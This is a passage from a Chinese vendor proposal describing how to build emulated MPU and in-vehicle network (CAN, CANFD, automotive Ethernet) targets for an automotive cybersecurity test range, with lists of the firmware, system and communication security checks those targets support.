title="功能实施方案"></a>功能实施方案</h5><ol><li>提供全面的靶标模拟功能，其中包括基础GPU模拟、内存模拟以及I/O设备模拟，通过这一系列的模拟，可以制作出所需的基础靶标。</li><li>支持通过动态二进制转换技术来模拟CPU的功能，这种高级模拟技术允许靶标系统实时地将目标CPU的机器代码转换为宿主机的机器代码，从而实现在宿主CPU上运行目标CPU指令的能力。</li><li>支持操作系统的全面模拟，这种模拟能力使得开发者可以将MPU操作系统构建成一个虚拟镜像，并且能够在靶场的基础平台上进行部署和运行，而这一过程完全不依赖于物理硬件；</li><li>具备在系统中运行应用程序的能力，这包括对APK文件的支持。系统不仅能够处理应用程序的安装和运行，而且还能够确保这些应用程序能像在真实硬件上一样，在虚拟环境中无缝执行。</li><li>支持FEEA3.0架构下的域控制器靶标，我们的靶标开发服务确保能够模拟FEEA3.0架构中的各个域控制器的功能和性能，以便开发者能够在一个高度仿真的环境中进行精确的测试和验证。</li><li>对未来架构中心处理单元（CPU）的全面支持，确保开发者能够在一个模拟环境中对这些先进的中央处理单元进行详尽的测试和验证。</li><li>支持从实际的硬件零部件中提取关键信息以制作精确的靶标镜像，用以来模拟多种靶标虚拟环境。</li><li>实现对零部件升级包的全面支持，能够通过这些更新包来制作最新且精确的靶标镜像，从而实现升级相关的靶标攻击。</li><li>支持多方面的虚拟化，包括操作系统、应用程序（APP）、网络通信、控制器局域网络CAN总线通信以及文件系统等虚拟化。靶标开发平台具备高度的灵活性和兼容性，以便模拟各种软件和硬件的交互，确保操作系统可以在虚拟环境中无缝运行，各类APP能在该环境中被有效地安装和测试。</li><li>靶标库支持x86架构的靶标，x86架构因其在工业标准计算机硬件中的普及和兼容性而被广泛采用，因此支持该架构对于确保我们的靶标能够与广泛的开发工具和现有的软件生态系统无缝对接至关重要。</li><li>靶标库支持arm架构的靶标，包括arm32和arm64。这一功能确保了我们的靶标库能够覆盖广泛的应用场景，从而为开发者提供了一个兼容性强、适用性广的测试环境。</li><li>支持将靶标按照指定的格式导入到靶场中，导入后即直接完成部署，部署后既可直接运行的功能，靶标允许用户将其快速集成到现有靶场环境中，通过一键导入并立即在靶场中部署，实现即时运行；</li><li>靶标的CPU、内存和硬盘资源可根据需求进行自定义配置，用户可以灵活地调整这些资源的分配。同时，为了确保系统的稳定性和应用的正常运行，可以对配置进行最低要求的限制，可避免靶标因资源不足而导致系统资源占用率过高，确保靶标具备足够的资源，以满足应用程序的需求，并保持系统的稳定性和性能。靶标上进行各种测试和实验，避免应用无法正常运行的问题。通过此种方式就无需担心资源不足的问题，从而更好地评估和分析系统的安全性和性能。</li></ol><p><strong>准备工作</strong></p><p>选择MPU：根据需求选择合适的MPU型号。</p><p>获取开发板：购买或制作一个带有所选MPU的开发板。</p><p>开发环境：安装MPU对应的开发环境和编译器。</p><p>硬件工具：准备编程器/调试器、电源、连接线等硬件工具。</p><p>相关文档：下载MPU的数据手册和参考资料。</p><p><strong>设计靶标程序</strong></p><p>需求分析：明确靶标程序需要验证的MPU功能。</p><p>编写代码：使用C语言或汇编语言编写靶标程序。</p><p>初始化MPU的硬件接口。</p><p>编写功能测试代码，如GPIO闪烁LED、串口通信等。</p><p>如果需要，编写中断服务程序和定时器任务。</p><p><strong>编译和调试</strong></p><p>编译代码：在开发环境中编译靶标程序，生成二进制文件。</p><p>下载程序：使用编程器/调试器将编译好的程序烧录到MPU中。</p><p>调试程序：通过调试器进行单步执行，监视寄存器和变量的值，确保程序按预期工作。</p><p><strong>验证和测试</strong></p><p>功能测试：逐一测试MPU的各项功能是否正常。</p><p>性能测试：如果需要，进行性能测试，比如执行速度、功耗测试。</p><p>稳定性测试：长时间运行靶标程序，检查MPU的稳定性。</p><p><strong>文档和报告</strong></p><p>编写文档：记录靶标制作的过程和测试结果。</p><p>问题记录：如果在测试中发现问题，详细记录并分析原因。</p><p>改进建议：提出对靶标程序的改进意见。</p><p>在进行性能和稳定性测试时，注意散热问题，防止MPU过热。</p><ol><li>初始阶段制作的靶标数量为10个，这是为了确保在开发周期的早期就有足够的样本进行测试与评估。</li><li>提供一套完整的靶标制作工具套件，这套工具套件中包括了一个关键的组件——靶标文件系统提取工具。该工具的设计目的是为了简化和加速靶标文件系统的提取过程，使得开发者能够轻松地从现有系统中提取必要的文件系统组件，进而构建出满足特定测试需求的靶标环境。</li><li>提供靶标固件或靶标访问方法、靶标对应架构配套的虚拟内核、根文件系统、qcow2磁盘镜像，作为靶标制作的需求输入条件，确保有一个稳定的接口用于与靶标进行交互。为了匹配靶标所模拟的硬件架构，有一个相应的虚拟内核，它能够在仿真环境中准确地模拟目标设备的操作。此外，一个完善的根文件系统是构建靶标的基础，它包含了所有必要的系统文件和目录结构，以支持靶标在虚拟环境中的运行。最后，一个qcow2格式的磁盘镜像也需要被制作和提供，它为靶标环境提供了一个可扩展且灵活的存储选项，可以在不同的虚拟化平台上进行部署和使用。</li><li>在构建MPU靶标系统时，在系统的各个层面上实现尽可能完整的再现，包括系统的目录结构、shell界面、文件系统、磁盘分部、通用网卡驱动、应用程序。这些组件的虚拟化实现需要确保与实际设备的操作表现一致性，达到100%的虚拟化率。在固件安全检测功能方面，靶标系统能够模拟绝大多数的固件安全测试场景，靶标涵盖85%以上的常见固件安全检测项，包含固件算法分析检测：对固件的信息安全加以分析，以便于开发者能够详尽地评估和验证固件中的算法是否具有潜在的安全漏洞；密钥硬编码检测：靶标能够辨识和评估代码中可能存在的硬编码密钥；服务接口访问安全：测试靶标能够对内部的服务接口进行深入的安全评估，防止任何未经授权的访问尝试，以及对数据完整性的潜在威胁；隐藏后门：能够精准地识别并报告可能存在于MPU内部的任何隐蔽后门；敏感数据：确保靶标能够有效地识别和标记出任何可能被嵌入到MPU中的敏感信息，如私密凭证、加密密钥或个人用户数据；配置文件安全：确保这些配置文件没有被设置为可能威胁系统安全的状态；固件加固安全：确保固件在设计和实施过程中的每一个环节都经过了严格的安全审计。同时，对于系统级的安全测试，靶标能够覆盖80%以上的检测项，包括Root检测：Root检测的目的是为了验证移动设备是否经过了提权操作，从而保证设备的系统安全性，防止未授权的修改和访问；Root防御：为了阻止未授权的Root访问，保护设备免受恶意软件和病毒的影响，确保用户数据和系统设置的安全；系统修复：在系统遭受损坏或功能异常时恢复其正常状态，以保持系统的稳定性和可靠性；系统防篡改检测：为了发现并阻止对系统关键部分的未授权更改，确保系统完整性和信任链的维护；系统启动安全检测：在设备启动过程中验证系统的完整性，防止恶意代码在启动时被加载；系统漏洞检测：识别和评估系统中存在的安全漏洞，以便及时修补，防止潜在的安全威胁；权限等级设置检查：确保系统中的权限设置符合安全策略，防止未授权的访问和操作；内存隔离安全性测试：验证不同应用程序和系统进程之间的内存区域是否得到了适当的隔离，以防止数据泄露和恶意攻击；应用授权管理安全性测试：确保应用程序的授权机制能够有效管理权限，防止越权行为；系统服务安全性测试：检查系统后台服务的安全性，确保它们不会成为系统漏洞的入口点。靶标在数据存储安全检测方面的检测覆盖率达到90%以上，以确保数据的存储安全，检测内容包含配置参数是否符合最低安全标准、日志数据等敏感信息是否做了加密存储，还有数据完整性检测：数据存储内容是否完整；敏感数据访问控制检测：敏感信息是否会被非授权访问；数据存取错误反馈检测：存储数据提取，是否返回值错误；非硬件存储密钥管理检测：非硬件加密的存储，秘钥保存是否安全检查；敏感数据残留检测：敏感数据清除/销毁后，是否有残留或能被恢复检测。此外，针对车内通信安全的靶标100%覆盖相关的安全检测项，这包括与CAN上车内控制单元的安全策略检测：确保车辆控制单元（ECU）之间通过CAN（Controller Area Network）总线进行的通信遵循预定的安全策略，以防止未授权的访问和数据篡改；与其他ECU通信的安全策略检测：验证ECU间通信是否符合安全协议和策略，确保数据交换的完整性和机密性；CAN报文抗重放测试：确保CAN总线上的通信报文具有足够的保护措施，以防止攻击者通过重放攻击来模拟合法报文；CAN总线模糊测试：通过发送意外或非法格式的数据到CAN总线，检查车辆系统对异常数据的响应和抵抗力，以此来确保系统的鲁棒性；诊断访问信息安全测试：验证诊断通信过程中的安全措施，确保只有授权的诊断工具能够访问车辆的诊断信息；诊断数据包防御信息安全测试：保护诊断数据包不被篡改或恶意利用，确保诊断过程的安全性；诊断模糊测试：通过向诊断系统发送不规则或异常的数据包，来测试系统对于非法输入的处理能力，以验证系统的容错性；诊断复位测试：验证诊断系统在接收到复位指令后能否正确地重置ECUs，确保复位过程的安全性和可靠性；诊断读写服务测试：确保诊断过程中的读写服务安全，验证只有授权的操作能够读取或修改ECU中的数据；诊断动作指令测试：验证诊断过程中发出的动作指令执行情况，确保指令的正确性和安全性；诊断通讯控制服务测试：检查诊断通信控制服务是否有适当的安全措施，防止未授权的通信控制行为；车载以太网服务认证测试：确认通过车载以太网进行的服务是否实施了认证机制，以确保通信的安全性；车载以太网重放攻击测试：验证车载以太网通信是否具有防止重放攻击的机制，以保护网络通信不被恶意利用；车载以太网未授权接入：检测和防止未授权设备接入车载以太网，确保网络的完整性和安全性；车载以太网模糊测试：发送异常或随机数据到车载以太网，测试网络系统对非法输入的抵抗力和处理能力；车载以太网端口扫描：识别车载以太网上开放的端口，并评估它们是否可能成为潜在的安全漏洞。对于日志的监控和审计靶标能100%的覆盖日志检测项，以便对应用程序的日志内容进行全面的安全检查，如检测异常行为、安全事件和潜在威胁等。通过这些全方位的安全检测覆盖，靶标系统为安全研究人员提供了一个强大而灵活的平台，以便进行深入的安全分析和评估。</li></ol><h5 id="技术实现内容-8"><a href="#技术实现内容-8" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><p>在MPU靶标开发过程中，遵循产品定制开发的基本原则，基于MPU的特性进行靶标开发，按照甲方需求，完成相应的靶标库开发工作。</p><ol><li>靶标库需求分析</li></ol><p>确定MPU靶标的开发目标，在智能网联汽车中MPU的应用范围和作用，继而确定开发的主要内容。根据开发所需的主要内容，确认MPU靶标的功能和性能，采用适合的硬件，完成基础GPU模拟、内存模拟、I/O设备模拟。</p><ol><li>架构设计</li></ol><p>设计MPU靶标库的软件架构，包括模块划分和接口定义，在做靶标库设计中，需要考虑可移植性和可扩展性，以支持不同的MPU芯片和应用场景、合适的编程语言和开发工具。首先需要满足的内容为能实现基础GPU模拟、内存模拟、I/O设备模拟，并通过动态二进制转换来模拟CPU，整个靶标库的基础环境支持操作系统的模拟，能够将MPU操作系统制作为虚拟镜像，并在靶场基础平台中部署运行，且不依赖硬件。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/c9a0aa130875b533791ca987b5235d1f.png" alt="1694319821279"></p><p>靶标库架构图</p><ol><li>驱动程序开发</li></ol><p>开发与MPU芯片相关的底层驱动程序，包括初始化、配置和控制等。实现对MPU芯片的各种功能和特性的访问接口。确保能覆盖FEEA2.0架构下的TBOX、IVI、网关、仪表等，并完成对FEEA3.0架构域控制器靶标的适配，将未来架构中央处理单元靶标。进行驱动程序的调试和测试，确保其正确性和稳定性。</p><p>驱动程序设计可以通过动态二进制转换来模拟CPU，将操作系统的模拟，通过能够将MPU操作系统制作为虚拟镜像，并在靶场基础平台中部署运行，能够实现完全不依赖硬件的配置。还可以在系统中运行应用程序，如APK文件等。</p><p>还能通过零部件提取制作靶标镜像，通过其升级包制作靶标镜像。</p><ol><li>中间件开发</li></ol><p>开发中间件模块，提供常用的功能和算法支持，包括任务调度、通信协议、文件系统、图形库等，如支持未来架构中央处理单元靶标，支持x86/arm（不限于arm32、arm64）架构靶标，可通过零部件提取制作靶标镜像，通过零部件的升级包制作靶标镜像，qcow2格式的靶标镜像，支持操作系统、APP、网络通信、CAN总线通信、文件系统的虚拟化。</p><p>考虑资源占用和性能优化，以满足不同应用场景的需求，实现靶标支持直接导入靶场部署并运行。</p><p>提供支撑qemu的靶标制作环境，和包含靶标文件系统提取工具的靶标制作工具，实现x86架构靶标、arm（不限于arm32、arm64）架构靶标，其靶标可支持直接导入靶场部署并运行，并提供靶标的初始20个，协助完成50个靶标的开发。</p><p>靶标的CPU、内存、硬盘资源可自定义配置，并对配置做最低要求限制，避免靶标因资源不足出现系统资源占用率过高，应用无法正常运行等</p><ol><li>应用程序开发</li></ol><p>开发示例应用程序，展示MPU靶标库的功能和性能，实现常见的应用场景，如MPU靶标对实物还原度包括系统目录、shell界面、文件系统、磁盘分区、通用网卡驱动、应用程序，对以上内容虚拟化覆盖率应达到100%。</p><p>提供的靶标应覆盖85%以上固件安全检测项，包含固件算法分析检测、密钥硬编码检测、服务接口访问安全、隐藏后门；敏感数据、配置文件安全、固件加固安全。</p><ol><li>固件算法分析检测</li></ol><p>我们的服务将深入分析固件中使用的各种算法，包括加密算法、散列函数、签名验证等。这一检测旨在确保算法的实现没有缺陷，且选择的算法能够抵御当前已知的攻击方法。我们会评估算法的强度，检查是否存在过时的或已被破解的算法使用，以及算法实现是否存在漏洞。</p><ol><li>密钥硬编码检测</li></ol><p>硬编码密钥是固件安全中的一个常见风险点。我们的检测将识别和评估固件中可能硬编码的密钥，包括但不限于私钥、公钥、密码等。硬编码的密钥可能会被攻击者发现并利用，从而破坏系统的安全性。我们的服务将确保密钥的管理和存储机制是安全的，以及密钥生成和更新过程符合最佳安全实践。</p><ol><li>服务接口访问安全</li></ol><p>服务接口是攻击者常见的攻击目标，我们的检测将确保固件中的所有服务接口都经过了严格的安全审计。这包括对Web服务接口、API端点、远程管理接口等进行全面的安全配置检查，确保它们都有适当的认证和授权机制，以及对数据传输加密的支持。</p><ol><li>隐藏后门检测</li></ol><p>隐藏后门可能是由于设计疏忽或恶意植入。我们的检测服务将使用先进的技术和方法来识别固件中可能存在的后门。这包括对固件的代码分析、行为监控以及异常通信模式的检测，以发现任何可能被植入的、未经授权的访问点。</p><ol><li>敏感数据和配置文件安全</li></ol><p>固件中的敏感数据和配置文件需要得到特别保护。我们的检测服务将评估这些信息的保护措施，确保敏感数据如用户凭证、配置设置等被适当地加密和安全地存储。此外，我们还会检查配置文件不会被未经授权的用户访问或修改。</p><ol><li>固件加固安全</li></ol><p>固件加固是指采取措施提高固件对抗攻击的能力。我们的检测服务将评估固件加固的程度，包括操作系统的安全配置、应用程序的安全性、启动过程的安全性以及其他防护措施。这也包括对固件进行定期的安全更新和补丁管理，以及确保固件在面对新出现的威胁时能够迅速响应。</p><p>提供的靶标覆盖80%以上系统安全检测项，包含Root检测，Root防御、系统修复、系统防篡改等检测、系统启动安全检测、系统漏洞检测等、权限等级设置检查、内存隔离安全性测试、应用授权管理安全性测试、系统服务安全性测试。</p><ol><li>Root检测与Root防御</li></ol><p>我们的服务包括对系统的Root访问权限进行深入检测，以确定是否有未授权或恶意的Root访问行为。Root权限可以提供对系统最深层次的控制，因此防御措施至关重要。我们评估系统的Root防御能力，确保有足够的安全防护措施来抵御Root级别的攻击和滥用。</p><ol><li>系统修复与系统防篡改检测</li></ol><p>系统的完整性对于保障运行安全至关重要。我们的检测服务会评估系统的自我修复能力，检查是否有自动修复受损文件和配置的机制。同时，我们会进行系统防篡改检测，确保关键系统文件和配置不会被未授权的更改。</p><ol><li>系统启动安全检测</li></ol><p>系统启动过程是攻击者常见的攻击目标，因为在这个阶段系统的防御措施可能尚未完全启动。我们的检测服务将验证启动加载器的安全性，包括固件保护和启动过程中的验证机制，确保系统启动时的完整性和安全性。</p><ol><li>系统漏洞检测</li></ol><p>我们的服务会定期扫描和识别系统中可能存在的已知漏洞，这包括操作系统、内核、服务和应用程序。通过使用最新的漏洞数据库和检测技术，我们能够及时发现并推荐相应的修复措施。</p><ol><li>权限等级设置检查</li></ol><p>适当的权限等级设置对于维护系统安全至关重要。我们的检测服务将检查系统中的用户帐户、进程和服务的权限设置，确保它们都符合最小权限原则，从而减少潜在的安全风险。</p><ol><li>内存隔离安全性测试</li></ol><p>内存隔离是防止恶意程序访问或修改其他程序数据的重要安全机制。我们的服务会测试系统的内存隔离机制，包括地址空间布局随机化（ASLR）和数据执行防止（DEP）等技术，以确保内存安全性。</p><ol><li>应用授权管理安全性测试</li></ol><p>应用程序的授权管理是控制应用访问系统资源的关键。我们的测试服务会评估应用授权管理的安全性，确保应用程序只能访问其授权的资源，防止越权行为。</p><ol><li>系统服务安全性测试</li></ol><p>系统服务是攻击者的另一个目标，因为它们通常具有较高的权限并在后台运行。我们的服务将测试这些服务的安全性，检查服务配置、权限设置以及与其他系统组件的交互是否存在安全隐患。</p><p>提供的靶标应覆盖90%以上数据存储安全检测，包含数据加密存储检查，如配置参数、日志数据等敏感信息加密存储、数据完整性检测、敏感数据访问控制检测、数据存取错误反馈检测，非硬件存储密钥管理检测，敏感数据残留检测等。</p><ol><li>数据加密存储检查</li></ol><p>检查日志数据、参数配置等全部的敏感信息，对强加密算法进行利用对数据存储。这包括对数据在传输和静态时的加密措施进行验证，以确保即使数据被未经授权的人员访问，也无法被解读。</p><ol><li>数据完整性检测</li></ol><p>数据完整性检测确保数据在存储和传输过程中未被篡改。我们使用校验和、数字签名等技术来验证数据的完整性。任何数据的非授权修改都会被检测系统识别，并触发相应的安全警报。</p><ol><li>敏感数据访问控制检测</li></ol><p>我们的服务包括验证数据访问控制策略的有效性，确保只有授权用户才能访问敏感数据。这涉及到对用户身份验证、角色基础访问控制（RBAC）和强制访问控制（MAC）策略的审查和测试。</p><ol><li>数据存取错误反馈检测</li></ol><p>为了防止错误的反馈信息泄露敏感数据，我们的检测服务会评估系统对于数据存取错误的处理方式。这包括错误消息的内容，确保它们不会暴露敏感信息或提示潜在的攻击者有关系统内部结构的信息。</p><ol><li>非硬件存储密钥管理检测</li></ol><p>密钥管理是加密存储的核心部分，我们的服务会检查非硬件存储的密钥管理策略和实践，包括密钥的生成、分发、存储、使用、更换和销毁过程，确保密钥管理的全生命周期安全。</p><ol><li>敏感数据残留检测</li></ol><p>在数据被删除或设备被重新用于其他目的之前，我们会检测设备上是否还残留有敏感数据。我们使用各种技术手段，如数据擦除标准和残留数据扫描工具，来确保敏感数据被彻底删除，避免数据泄露。</p><p>提供的靶标应100%覆盖车内通信安全检测，包含与CAN上车内控制单元的安全策略检测、与其他ECU通信的安全策略检测、CAN报文抗重放测试、CAN总线模糊测试、诊断访问信息安全测试、诊断数据包防御信息安全测试、诊断模糊测试、诊断复位测试、诊断读写服务测试、诊断动作指令测试、诊断通讯控制服务测试、车载以太网服务认证测试、车载以太网重放攻击测试、车载以太网未授权接入、车载以太网模糊测试、车载以太网端口扫描、提供的靶标应100%覆盖日志检测，包含应用程序日志内容检测等等。以满足MPU靶标库在实验场景中的使用需求。</p><ol><li>车内控制单元与CAN通信的安全策略检测</li></ol><p>评估车辆内部网络中每个控制单元（ECU）的安全策略，确保它们能够抵御未授权访问和数据篡改。</p><ol><li>与其他ECU通信的安全策略检测</li></ol><p>检查ECU之间的通信安全措施，包括身份验证和授权协议，确保通信过程的安全性。</p><ol><li>CAN报文抗重放测试</li></ol><p>执行抗重放测试来验证系统是否能够检测和阻止重放攻击，其中旧的通信报文被重新发送以产生不正当的行为。</p><ol><li>CAN总线模糊测试</li></ol><p>通过向CAN总线发送异常或随机数据来测试系统的鲁棒性，确保系统能够妥善处理无效或异常的输入。</p><ol><li>诊断访问信息安全测试</li></ol><p>验证诊断访问的安全性，确保只有授权的操作能够执行，并且敏感信息得到保护。</p><ol><li>诊断数据包防御信息安全测试</li></ol><p>测试和评估诊断数据包的安全防御机制，确保数据包在传输过程中不会被截获或篡改。</p><ol><li>诊断模糊测试</li></ol><p>对诊断服务进行模糊测试，以检查系统对异常或意外输入的处理能力。</p><ol><li>诊断复位测试</li></ol><p>评估诊断复位功能的安全性，确保系统能够安全地恢复到预设状态。</p><ol><li>诊断读写服务测试</li></ol><p>验证读写服务的安全性，确保只有授权的操作才能访问和修改ECU的配置或数据。</p><ol><li>诊断动作指令测试</li></ol><p>测试动作指令的执行安全性，确保这些指令不会被恶意利用来对车辆进行不当操作。</p><ol><li>诊断通讯控制服务测试</li></ol><p>评估诊断通信控制服务的安全性，确保通信机制不会被滥用。</p><ol><li>车载以太网服务认证测试</li></ol><p>确保车载以太网服务实施了适当的认证机制，防止未授权的访问。</p><ol><li>车载以太网重放攻击测试</li></ol><p>测试车载以太网系统是否能够抵御重放攻击，保证通信的时效性和安全性。</p><ol><li>车载以太网未授权接入测试</li></ol><p>检测车载以太网系统对未授权接入的防护能力，确保网络的封闭性。</p><ol><li>车载以太网模糊测试</li></ol><p>对车载以太网进行模糊测试，以验证系统对异常数据的处理能力。</p><ol><li>车载以太网端口扫描</li></ol><p>执行端口扫描以发现车载以太网系统中可能存在的未加固的端口或服务。</p><ol><li>日志检测</li></ol><p>全面检测系统日志，包括应用程序日志，以确保日志内容的完整性和安全性，同时验证日志记录机制是否能够有效地记录所有关键事件。</p><p>在提供技术开发和服务的同时，还提供开发文档和示例代码，以便甲方快速上手和开发自己的应用。</p><ol><li>测试和验证</li></ol><p>在完成相关开发工作后，进行功能测试和性能测试，验证MPU靶标库的功能和性能是否符合要求。相关要求将进行逐一的验证测试，使用各种测试工具和设备进行全面的测试覆盖。</p><ol><li>文档和支持</li></ol><p>提供详细的技术文档，包括库的使用说明和接口文档。</p><p>提供技术支持和培训，解答用户的问题和提供帮助。</p><h4 id="E-E架构通信网络靶标开发方案"><a href="#E-E架构通信网络靶标开发方案" class="headerlink" title="E/E架构通信网络靶标开发方案"></a>E/E架构通信网络靶标开发方案</h4><h5 id="功能实施方案-9"><a href="#功能实施方案-9" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><ol><li>支持8个现有车型或正在研发中车型的车载网络通信靶标，靶标系统模拟这些车型各种车载通信网络的特性和协议，生成对应的靶标，确保与这些靶标能适配于整个靶场系统。</li><li>支持LIN、CAN、CANFD总线协议的通信拓扑靶标，并根据车型创建模板，模板支持更新。靶标系统支持LIN、CAN和CANFD这三种主流的车载网络通信协议，能够构建出符合各种车型通信拓扑的靶标。为了适应不同车型的需求，该系统允许用户根据特定车型创建通信拓扑的模板，并且这些模板可以随着车型的更新或协议的变化而进行相应的更新和迭代，确保靶标测试的持续有效性和兼容性。产品功能截图见下：</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/9bb0cec0320ecd8076a852309fe80260.png" alt="企业微信截图_17053323635139"></p><p>LIN通信拓扑</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/855d2b0f5aae04233443c20fe8a6ed1f.png" alt="企业微信截图_17053323987423"></p><p>CAN通信拓扑</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/3eee870b14ee68255b8d09b97eda30a0.png" alt="企业微信截图_17053324341782"></p><p>CANFD通信拓扑</p><ol><li>实现对车载以太网通信拓扑靶标，这不仅包括网络的物理结构，还涵盖了数据流、节点行为和网络管理等层面。为了满足不同车型对通信网络的特定需求，支持可创建模板、配置模板，这些模板能够反映出各车型特有的通信结构与行为模式。模板可根据需求进行更新，通过模板更新能够迅速适应车辆技术的迭代升级，包括硬件变动、软件升级以及新的通信协议的应用。</li><li>基于模板部署各种通信安全组件，以加强车载网络的安全性。这些模板包含了安全操作配置SecOC的实现，它们还被设计为可扩展的，以便能够集成更多的安全组件，比如加密模块、认证机制和安全监控工具。</li><li>支持已开发完成的各种模型、组件和应用的部署，而且能够无缝地集成它们进入复杂的车载网络环境中。该系统的设计允许用户轻松地导入预先构建的软件资产，包括安全模块、通信协议栈、应用程序接口以及各类仿真工具。</li><li>靶标的CPU、内存和硬盘资源可根据需求进行自定义配置，用户可以灵活地调整这些资源的分配。同时，为了确保系统的稳定性和应用的正常运行，可以对配置进行最低要求的限制，可避免靶标因资源不足而导致系统资源占用率过高，确保靶标具备足够的资源，以满足应用程序的需求，并保持系统的稳定性和性能。靶标上进行各种测试和实验，避免应用无法正常运行的问题。通过此种方式就无需担心资源不足的问题，从而更好地评估和分析系统的安全性和性能。</li><li>支持基于预定义模板快速部署各类入侵检测组件，确保能够适应不同的安全测试场景。支持车载入侵检测系统IDS，这样可以在模拟的网络环境中有效地监测和识别潜在的恶意行为或未授权的入侵尝试。</li></ol><p><strong>准备工作</strong></p><p>选择硬件：根据需求选择合适的E/E架构通信网络靶标硬件。</p><p>获取开发板：购买或制作一个带有所选E/E架构通信网络靶标的开发板。</p><p>开发环境：安装E/E架构通信网络靶标对应的开发环境和编译器。</p><p>硬件工具：准备编程器/调试器、电源、连接线等硬件工具。</p><p>相关文档：下载E/E架构通信网络靶标的数据手册和参考资料。</p><p><strong>设计靶标程序</strong></p><p>需求分析：明确靶标程序需要验证的E/E架构通信网络靶标功能。</p><p>编写代码：使用C语言或汇编语言编写靶标程序。</p><p>初始化E/E架构通信网络靶标的硬件接口。</p><p>编写功能测试代码，如GPIO闪烁LED、串口通信等。</p><p>如果需要，编写中断服务程序和定时器任务。</p><p><strong>编译和调试</strong></p><p>编译代码：在开发环境中编译靶标程序，生成二进制文件。</p><p>下载程序：使用编程器/调试器将编译好的程序烧录到E/E架构通信网络靶标中。</p><p>调试程序：通过调试器进行单步执行，监视寄存器和变量的值，确保程序按预期工作。</p><p><strong>验证和测试</strong></p><p>功能测试：逐一测试E/E架构通信网络靶标的各项功能是否正常。</p><p>性能测试：如果需要，进行性能测试，比如执行速度、功耗测试。</p><p>稳定性测试：长时间运行靶标程序，检查E/E架构通信网络靶标的稳定性。</p><p><strong>文档和报告</strong></p><p>编写文档：记录靶标制作的过程和测试结果。</p><p>问题记录：如果在测试中发现问题，详细记录并分析原因。</p><p>改进建议：提出对靶标程序的改进意见。</p><p>在进行性能和稳定性测试时，注意散热问题，防止E/E架构通信网络靶标过热。</p><ol><li>提供靶标制作培训，涵盖所有与靶标制作相关的关键技术和步骤，确保开发人员能够充分理解和掌握从设计到实施的整个制作过程。</li><li>初始阶段制作的靶标数量为5个，这是为了确保在开发周期的早期就有足够的样本进行测试与评估，其中包含的靶标节点20个。</li><li>构建了一个高度仿真的通信网络环境，能完全保证其实物还原度。包含了SecOC和IDS等安全组件并能够运行的CAN/CANFD、车载以太网等通信协议，这些模拟实现了高度的真实性而不依赖于具体的硬件。靶标系统能够全面覆盖通信业务安全检测的需求，确保了100%的测试覆盖率。包括车载车载CAN总线抗DoS测试：评估车辆的控制器区域CAN总线在面对拒绝服务（DoS）攻击时的抵抗力；CAN报文抗重放测试：验证CAN总线上的通信是否具备适当的安全机制来抵抗重放攻击，这种攻击涉及捕获合法的通信报文并重新发送以试图欺骗系统执行未授权的操作；CAN总线模糊测试：通过向CAN总线发送异常或随机生成的数据包，以测试车辆系统对意外或错误数据的处理能力；诊断访问信息安全测试：验证了诊断工具访问车辆系统时的安全性，确保只有授权的用户才能进行诊断操作，防止未授权访问敏感数据或控制功能；诊断数据包防御信息安全测试：检查诊断数据包在传输过程中是否具有足够的安全保护，以防止数据篡改或截取，确保诊断过程的完整性和机密性；诊断模糊测试：在诊断模糊测试中，系统会接收到不规则或格式不正确的诊断请求，目的是验证系统能够安全地处理无效的诊断指令，不会因此而导致系统崩溃或不当行为；诊断复位测试：评估车辆系统在接收到复位命令后的响应。它确保系统能够按照预期安全地重启，同时验证复位过程中的数据保护和安全措施；诊断读写服务测试：确认诊断过程中的读写操作是否安全，确保只有授权的请求能够读取或修改ECU的数据；诊断动作指令测试：为了验证车辆的ECU是否能够正确识别并执行来自诊断工具的动作指令，如激活某个执行器或调整某些参数；诊断通讯控制服务测试：检查ECU是否仅响应来自授权诊断工具的通讯控制请求。这包括暂停或激活某些ECU功能的能力；车载以太网服务认证测试：确保所有通过车载以太网进行的通信都经过适当的认证过程。这防止未授权的访问和数据泄露，确保数据交换的安全性和完整性；车载以太网重放攻击测试：确保车载以太网中实施了有效的机制来防止重放攻击，即攻击者捕获合法的通信数据包并重新发送它们以期引发未授权的操作；车载以太网未授权接入：用于检测和阻止未授权设备接入车载以太网系统。目的是确保网络的完整性和安全性不被破坏，防止潜在的恶意行为；车载以太网模糊测试：通过向车载以太网发送不规则或格式错误的数据包，测试网络系统对非法输入的处理能力；车载以太网端口扫描：通过扫描车载以太网上的端口来识别哪些端口是开放的，哪些服务是活动的。这一系列的测试确保了靶标系统能够在各种攻击和威胁面前进行有效的安全评估，为车载网络的安全提供坚实的测试基础。</li><li>提供三年的新业务平台靶标开发支持，确保整个靶标使用周期内，为招标单位提供全面的技术支持。</li></ol><h5 id="技术实现内容-9"><a href="#技术实现内容-9" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><p>在E/E架构通信网络靶标开发过程中，遵循产品定制开发的基本原则，基于E/E架构通信网络的特性进行靶标开发，按照甲方需求，完成相应的靶标库开发工作。</p><ol><li>靶标库需求分析</li></ol><p>根据确定E/E架构通信网络靶标的应用需求，在E/E架构下的通信主要需满足LIN、CAN、ETH-T1、CANFD总线协议的通信拓扑，靶标可满足此拓扑下的基本通信功能，通过靶标的部署，满足现有和在研车型的车载网络通信靶标，并根据车型创建模板，模板支持更新。</p><ol><li>软件开发</li></ol><p>首先，完成开发与E/E架构通信网络相关的软件模块，基于模板部署通信安全组件，支持SecOC组件，可以将已开发完成的模型、组件、应用的部署，支持基于模板部署入侵检测组件，支持车载IDS，并将预警信息回传至云端平台进行处理。</p><ol><li>硬件开发</li></ol><p>设计与E/E架构通信网络靶标相关的硬件电路，包括通信网络接口、总线控制器和节点电路等，考虑电路稳定性、可靠性、及安全性以及与外部设备的连接方式，我们设计了靶标的CPU、内存、硬盘资源可自定义配置，并对配置做最低要求限制，避免靶标因资源不足出现系统资源占用率过高，应用无法正常运行等。</p><p>硬件的设计可满足8个现有和在研车型的车载网络通信靶标，满足LIN、CAN、CANFD总线协议的通信拓扑靶标，通过技术开发手段，编写靶标